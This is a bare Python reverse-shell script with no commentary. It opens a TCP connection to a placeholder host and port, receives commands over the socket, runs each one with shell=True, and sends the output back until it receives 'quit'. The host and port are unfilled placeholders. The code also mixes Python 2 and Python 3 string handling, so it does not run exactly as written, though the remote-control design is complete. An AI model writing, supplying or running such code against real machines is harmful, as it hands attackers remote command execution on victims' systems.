import subprocess
import socket
host = "host"
host = socket.gethostbyname(host)
port = port
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((host, port))
client.send("Connected! quite to exit!\nCommand here: ")
while 1:
     data = client.recv(1024)
     if data.lstrip() ==  "quit\n": break
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdoutput = proc.stdout.read()+proc.stderr.read()
     stdoutput = stdoutput.decode('gbk').encode('utf-8')
     client.send(stdoutput)
client.send("Bye!")
client.close()